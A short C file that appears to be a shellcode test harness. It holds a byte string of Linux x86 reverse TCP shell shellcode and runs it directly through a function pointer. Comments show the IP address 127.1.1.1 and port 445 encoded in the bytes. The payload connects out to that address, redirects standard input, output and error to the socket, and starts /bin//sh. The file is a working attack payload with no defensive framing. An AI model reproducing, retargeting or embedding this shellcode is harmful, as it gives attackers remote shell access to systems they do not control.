#include<stdio.h>
#include<string.h>

//**IP ADDRESS = 127.1.1.1 , shellcode = \x01\x01\x01\x7f **// 
//** PORT NUMBER = 445 , shellcode =\x01\xbd **//

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xff\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x01\xbd\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x03\x74\x02\xeb\xf3\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	